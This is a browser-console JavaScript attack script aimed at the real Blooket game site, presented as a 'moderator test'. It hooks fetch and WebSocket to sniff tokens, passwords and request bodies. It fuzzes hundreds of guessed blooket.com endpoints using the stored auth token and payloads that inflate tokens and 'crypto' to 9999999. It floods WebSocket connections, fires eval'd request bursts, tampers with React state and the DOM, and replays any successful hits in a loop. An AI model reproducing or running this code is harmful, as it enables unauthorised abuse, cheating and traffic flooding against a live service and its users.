(async () => {
    if (document.getElementById('CHAOS_EXPLOIT')) return console.log('Chaos already unleashed!');

    console.log('%c CHAOS EXPLOIT | BLOOKET ARMAGEDDON %c\n\tAlastair-Appazzola’s Ultimate Moderator Test - March 26, 2025', 'color: #ff00ff; font-size: 2.5rem; font-weight: bold; text-shadow: 0 0 10px #ff00ff', '');

    const style = document.createElement('style');
    style.innerHTML = `
        #CHAOS_EXPLOIT { position: fixed; top: 10px; left: 10px; width: 600px; height: 700px; background: #000; z-index: 99999; color: #0f0; padding: 20px; font-family: monospace; overflow-y: auto; border: 3px solid #ff00ff; box-shadow: 0 0 30px #ff00ff; }
        .chaosBtn { padding: 12px; margin: 5px 0; background: #222; cursor: pointer; transition: all 0.3s; border: 1px solid #ff00ff; }
        .chaosBtn:hover { background: #ff00ff; color: #000; transform: scale(1.1); box-shadow: 0 0 15px #ff00ff; }
        #stopChaosBtn { padding: 12px; margin: 5px 0; background: #f00; cursor: pointer; display: none; border: 1px solid #fff; }
        #stopChaosBtn:hover { background: #ff5555; }
        #chaosLog { height: 500px; overflow-y: auto; margin-top: 15px; border-top: 2px solid #0f0; padding-top: 10px; }
        #chaosStats { color: #ff0; font-size: 1rem; margin-bottom: 15px; text-shadow: 0 0 5px #ff0; }
    `;
    document.head.appendChild(style);

    const gui = document.createElement('div');
    gui.id = 'CHAOS_EXPLOIT';
    const stats = document.createElement('div');
    stats.id = 'chaosStats';
    const logArea = document.createElement('div');
    logArea.id = 'chaosLog';
    gui.append(stats, logArea);
    document.body.appendChild(gui);

    let hits = 0, misses = 0, wsConnections = 0, potentials = [];
    const updateStats = () => stats.innerText = `Hits: ${hits} | Misses: ${misses} | WS Active: ${wsConnections} | Potentials: ${potentials.length}`;

    const origLog = console.log;
    console.log = (...args) => {
        origLog(...args);
        logArea.innerHTML += `<div>${new Date().toISOString()} - ${args.join(' ')}</div>`;
        logArea.scrollTop = logArea.scrollHeight;
    };

    console.log('CHAOS UNLEASHED—Crypto Hack annihilation begins, Alastair-Appazzola!');
    const origFetch = window.fetch;
    window.fetch = async (url, opts) => {
        if (url.includes('blooket.com')) {
            console.log('Sniffed Fetch:', { url, method: opts.method || 'GET', headers: opts.headers || {}, body: opts.body || 'N/A' });
            if (opts.body) {
                try {
                    const parsed = JSON.parse(opts.body);
                    if (parsed.token || parsed.amount || parsed.crypto || parsed.password) {
                        console.log('Potential Crypto Hack payload:', parsed);
                        potentials.push({ url, method: opts.method || 'POST', headers: opts.headers || {}, body: parsed });
                    }
                } catch {}
            }
        }
        return origFetch(url, opts);
    };

    const liveWSUrls = new Set();
    const origWS = window.WebSocket;
    window.WebSocket = function(url) {
        if (url.includes('blooket.com')) {
            console.log('Sniffed WS Attempt:', url);
            liveWSUrls.add(url);
        }
        const ws = new origWS(url);
        ws.onopen = () => { wsConnections++; updateStats(); console.log('WS Hit:', url); };
        ws.onerror = () => { console.log('WS Miss:', url); };
        ws.onclose = () => { wsConnections--; updateStats(); };
        ws.onmessage = (msg) => console.log('WS Data:', url, msg.data);
        return ws;
    };

    const fuzzEndpoints = async (base) => {
        const prefixes = ['/api', '/v1', '/v2', '/game', '/play', '/user', '/stats', '/live', '/crypto', '/hack'];
        const actions = ['tokens', 'users', 'games', 'state', 'update', 'session', 'player', 'auth', 'cheat', 'crypto', 'password', 'score', 'points'];
        const params = ['?id=', '?token=', '?amount=', '?key=', '?crypto=', '?password=', '?gameId=', '?rand='];
        const endpoints = [];
        for (const prefix of prefixes) {
            for (const action of actions) {
                endpoints.push(`${base}${prefix}/${action}`);
                params.forEach(p => endpoints.push(`${base}${prefix}/${action}${p}${Math.random().toString(36).slice(2)}`));
            }
        }
        return endpoints;
    };

    let abortChaos = false;

    const tests = [
        {
            name: 'API Apocalypse',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'API Apocalypse';
                const stopBtn = document.createElement('div');
                stopBtn.id = 'stopChaosBtn';
                stopBtn.innerText = 'STOP CHAOS';
                stopBtn.onclick = () => { abortChaos = true; stopBtn.style.display = 'none'; console.log('Chaos aborted, Alastair-Appazzola!'); };
                btn.onclick = async () => {
                    abortChaos = false;
                    stopBtn.style.display = 'block';
                    const bases = ['https://api.blooket.com', 'https://play.blooket.com', 'https://dashboard.blooket.com'];
                    const methods = ['POST', 'GET', 'PUT', 'PATCH'];
                    const tokenGuesses = [localStorage.token || 'guest', `Bearer ${Math.random().toString(36).slice(2)}`, btoa(JSON.stringify({ id: 'chaos', ts: Date.now() }))];
                    for (const base of bases) {
                        const endpoints = await fuzzEndpoints(base);
                        console.log(`Unleashing API apocalypse on ${base} - ${endpoints.length} endpoints...`);
                        for (const url of endpoints) {
                            if (abortChaos) break;
                            const method = methods[Math.floor(Math.random() * methods.length)];
                            const token = tokenGuesses[Math.floor(Math.random() * tokenGuesses.length)];
                            console.log('Fuzzing:', url);
                            try {
                                const res = await fetch(url, {
                                    method,
                                    headers: { 
                                        'Authorization': token,
                                        'Content-Type': 'application/json',
                                        'X-Chaos': 'ALASTAIR-APPAZZOLA',
                                        'User-Agent': `ChaosBot/${Math.random()}`,
                                    },
                                    body: method !== 'GET' ? JSON.stringify({ 
                                        amount: 9999999, 
                                        tokens: 9999999, 
                                        crypto: 9999999, 
                                        password: Math.random().toString(36).slice(2), 
                                        cheat: true, 
                                        chaos: Math.random() 
                                    }) : undefined
                                });
                                if (res.ok) {
                                    hits++;
                                    const data = await res.json();
                                    console.log(`API VULN HIT at ${url}:`, data);
                                    potentials.push({ url, method, headers: { 'Authorization': token }, body: { amount: 9999999, tokens: 9999999, crypto: 9999999 } });
                                } else {
                                    misses++;
                                    console.log(`No vuln at ${url}:`, res.status);
                                }
                            } catch (e) {
                                misses++;
                                console.log(`Missed ${url}:`, e.message);
                            }
                            await new Promise(r => setTimeout(r, 50));
                        }
                        if (abortChaos) break;
                    }
                    stopBtn.style.display = 'none';
                    updateStats();
                };
                gui.append(btn, stopBtn);
            }
        },
        {
            name: 'WebSocket Annihilation',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'WebSocket Annihilation';
                btn.onclick = async () => {
                    const wsBases = ['wss://play.blooket.com', 'wss://api.blooket.com', 'wss://dashboard.blooket.com'];
                    const wsPaths = ['/ws', '/socket', '/game', '/live', '/play', '/cheat', '/crypto', '/hack', ''];
                    const tokenGuesses = [localStorage.token || 'guest', `Bearer ${Math.random().toString(36).slice(2)}`, btoa(JSON.stringify({ id: 'chaos', ts: Date.now() }))];
                    const liveUrls = liveWSUrls.size ? Array.from(liveWSUrls) : [];
                    console.log('Sniffed WS targets:', liveUrls);
                    const targets = liveUrls.length ? liveUrls : wsBases.flatMap(base => wsPaths.map(path => `${base}${path}`));
                    console.log(`Annihilating ${targets.length} WS connections with ${tokenGuesses.length} keys...`);
                    targets.forEach(url => {
                        tokenGuesses.forEach(token => {
                            const fullUrl = `${url}?token=${encodeURIComponent(token)}&chaos=${Math.random()}`;
                            console.log('Blasting WS:', fullUrl);
                            let retries = 10;
                            const connect = () => {
                                const ws = new WebSocket(fullUrl);
                                ws.onopen = () => {
                                    wsConnections++;
                                    console.log('WS Connected:', fullUrl, '—unleashing hell...');
                                    const flood = setInterval(() => {
                                        if (ws.readyState === 1) ws.send(JSON.stringify({ 
                                            type: ['cheat', 'auth', 'update', 'crypto', 'hack'][Math.floor(Math.random() * 5)], 
                                            tokens: 9999999, 
                                            crypto: 9999999, 
                                            password: Math.random().toString(36).slice(2), 
                                            chaos: Math.random() 
                                        }));
                                        else clearInterval(flood);
                                    }, 50);
                                };
                                ws.onerror = () => { if (retries--) setTimeout(connect, 500); };
                                ws.onmessage = (msg) => {
                                    console.log('WS Response:', fullUrl, msg.data);
                                    if (msg.data.includes('token') || msg.data.includes('crypto')) potentials.push({ url: fullUrl, type: 'WS', body: JSON.parse(msg.data) });
                                };
                            };
                            connect();
                        });
                    });
                };
                gui.appendChild(btn);
            }
        },
        {
            name: 'Stealth Proxy Domination',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Stealth Proxy Domination';
                btn.onclick = () => {
                    const tokenGuess = localStorage.token || 'guest';
                    const chaosCode = `
                        const urls = Array(100).fill().map((_, i) => 
                            'https://' + ['api', 'play', 'dashboard'][i % 3] + '.blooket.com/' + 
                            ['api', 'v1', 'game', 'crypto'][i % 4] + '/' + 
                            ['tokens', 'games', 'stats', 'update', 'crypto', 'hack'][i % 6] + 
                            '?chaos=' + Math.random()
                        );
                        let hits = 0;
                        urls.forEach(url => {
                            fetch(url, {
                                method: ['POST', 'PUT', 'PATCH'][Math.floor(Math.random() * 3)],
                                headers: { 
                                    'Authorization': '${tokenGuess}',
                                    'Content-Type': 'application/json',
                                    'X-Chaos': 'ALASTAIR-APPAZZOLA',
                                    'Origin': 'https://play.blooket.com'
                                },
                                body: JSON.stringify({ 
                                    amount: 9999999, 
                                    tokens: 9999999, 
                                    crypto: 9999999, 
                                    password: Math.random().toString(36).slice(2), 
                                    chaos: true 
                                })
                            })
                            .then(res => res.ok ? res.json() : Promise.reject(res.status))
                            .then(data => { console.log('Stealth Hit:', url, data); hits++; })
                            .catch(e => console.log('Stealth Miss:', url, e));
                        });
                        setTimeout(() => console.log('Stealth Domination Done - Hits:', hits), 10000);
                    `;
                    eval(chaosCode);
                    console.log('Stealth proxy domination unleashed via eval, Alastair-Appazzola!');
                };
                gui.appendChild(btn);
            }
        },
        {
            name: 'State & DOM Obliteration',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'State & DOM Obliteration';
                btn.onclick = () => {
                    const reactRoot = window._reactRootContainer || window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.get(1)?.getFiberRoot();
                    if (reactRoot) {
                        let stateNode = reactRoot.current;
                        const mutate = (node) => {
                            if (node.memoizedState) {
                                for (let key in node.memoizedState) {
                                    if (typeof node.memoizedState[key] === 'number' && 
                                        (key.includes('token') || key.includes('crypto') || key.includes('point') || key.includes('score') || key.includes('amount'))) {
                                        node.memoizedState[key] = 9999999 + Math.floor(Math.random() * 10000);
                                        console.log(`Mutated ${key} to`, node.memoizedState[key]);
                                    }
                                }
                            }
                            if (node.child) mutate(node.child);
                            if (node.sibling) mutate(node.sibling);
                        };
                        mutate(stateNode);
                        console.log('State annihilated—Crypto Hack in ruins!');
                    }
                    const domTargets = document.querySelectorAll('[class*="token"], [class*="crypto"], [class*="point"], [class*="score"], [id*="token"], [id*="crypto"]');
                    domTargets.forEach((el, i) => {
                        el.textContent = `999999${i}`;
                        el.style.color = '#ff00ff';
                        el.style.fontSize = '2rem';
                        el.style.textShadow = '0 0 10px #ff00ff';
                        console.log('DOM Nuked:', el);
                    });
                    for (let i = 0; i < 20; i++) {
                        const fake = document.createElement('div');
                        fake.className = `chaos_${Math.random().toString(36).slice(2)}`;
                        fake.textContent = `CHAOS_999999${i}`;
                        fake.style.position = 'absolute';
                        fake.style.top = `${Math.random() * 100}%`;
                        fake.style.left = `${Math.random() * 100}%`;
                        fake.style.color = '#0f0';
                        fake.style.fontSize = '1.5rem';
                        document.body.appendChild(fake);
                    }
                    console.log('DOM flooded with chaos, Alastair-Appazzola!');
                };
                gui.appendChild(btn);
            }
        },
        {
            name: 'Exploit Everything',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'chaosBtn';
                btn.innerText = 'Exploit Everything';
                btn.onclick = async () => {
                    if (!potentials.length) return console.log('No potentials yet—unleash more chaos first!');
                    console.log(`Exploiting ${potentials.length} potentials—total annihilation begins...`);
                    let exploitsFound = 0;
                    const loop = async () => {
                        for (const { url, method, headers, body, type } of potentials) {
                            if (abortChaos) break;
                            console.log(`Exploiting ${type || 'API'} at ${url}`);
                            if (type === 'WS') {
                                const ws = new WebSocket(url);
                                ws.onopen = () => {
                                    ws.send(JSON.stringify({ ...body, amount: 9999999, tokens: 9999999, crypto: 9999999, chaos: true }));
                                    console.log('WS Exploit sent:', url);
                                };
                            } else {
                                try {
                                    const res = await fetch(url, {
                                        method: method || 'POST',
                                        headers: { ...headers, 'X-Chaos': 'ALASTAIR-APPAZZOLA' },
                                        body: JSON.stringify({ ...body, amount: 9999999, tokens: 9999999, crypto: 9999999, chaos: true })
                                    });
                                    if (res.ok) {
                                        exploitsFound++;
                                        hits++;
                                        console.log(`Exploit SUCCESS at ${url}:`, await res.json());
                                    } else {
                                        misses++;
                                        console.log(`Exploit failed at ${url}:`, res.status);
                                    }
                                } catch (e) {
                                    misses++;
                                    console.log(`Exploit error at ${url}:`, e.message);
                                }
                            }
                            await new Promise(r => setTimeout(r, 100));
                        }
                        if (!abortChaos && exploitsFound < potentials.length) {
                            console.log('Looping exploits—more chaos to come!');
                            await new Promise(r => setTimeout(r, 1000));
                            loop();
                        } else {
                            console.log(`Chaos complete! Exploits found: ${exploitsFound}`);
                        }
                    };
                    loop();
                    updateStats();
                };
                gui.appendChild(btn);
            }
        }
    ];

    tests.forEach(test => {
        console.log(`Armed: ${test.name}`);
        test.run();
    });

    document.querySelectorAll('#CHAOS_EXPLOIT:not(:last-child)').forEach(el => el.remove());

    setInterval(() => {
        const suspicious = document.querySelectorAll('[data-amount], [data-tokens], [data-crypto], [data-password]');
        if (suspicious.length) console.log('Suspicious elements detected:', suspicious);
        updateStats();
    }, 3000);
})();
